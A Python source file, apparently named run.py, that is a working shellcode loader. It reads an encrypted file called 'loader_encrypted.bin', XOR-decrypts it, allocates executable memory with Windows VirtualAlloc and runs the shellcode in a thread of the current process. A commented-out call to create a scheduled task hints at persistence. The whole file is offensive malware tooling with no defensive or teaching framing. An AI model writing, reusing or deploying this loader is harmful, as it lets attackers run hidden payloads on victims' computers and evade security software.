import os
import ctypes
import sys
import platform
import subprocess
import threading
import tempfile

XOR_KEY = 0xAA

def xor_decrypt(data: bytes, key: int) -> bytes:
    return bytes([b ^ key for b in data])

def read_and_decrypt_shellcode():
    try:
        script_dir = os.path.dirname(os.path.realpath(__file__))
        encrypted_path = os.path.join(script_dir, "loader_encrypted.bin")

        print(f"Reading encrypted shellcode from {encrypted_path}")
        with open(encrypted_path, "rb") as f:
            encrypted = f.read()

        print(f"File size: {len(encrypted)} bytes")
        decrypted = xor_decrypt(encrypted, XOR_KEY)
        print("Decrypted shellcode")
        return decrypted
    except Exception as e:
        print(f"[ERROR] read_and_decrypt_shellcode: {e}")
        sys.exit(1)

def execute_shellcode_in_current_process(shellcode):
    try:
        if platform.architecture()[0] != "32bit":
            print("[ERROR] Only 32-bit architecture is supported.")
            return

        shellcode_size = len(shellcode)
        print(f"{shellcode_size} bytes loaded")

        memory = ctypes.windll.kernel32.VirtualAlloc(
            None, shellcode_size, 0x3000, 0x40
        )
        if not memory:
            print("[ERROR] VirtualAlloc failed")
            return

        ctypes.memmove(memory, shellcode, shellcode_size)
        print("Shellcode copied to memory")

        shellcode_func = ctypes.cast(memory, ctypes.CFUNCTYPE(None))
        print("Executing shellcode...")
        shellcode_func()
        print("Shellcode execution done")
    except Exception as e:
        print(f"[ERROR] execute_shellcode: {e}")
        
def main():
    print("Starting run.py")

    shellcode = read_and_decrypt_shellcode()

    t1 = threading.Thread(target=execute_shellcode_in_current_process, args=(shellcode,))
    # t2 = threading.Thread(target=create_task_scheduler)

    t1.start()
    # t2.start()

    t1.join()
    # t2.join()

if __name__ == "__main__":
    main()
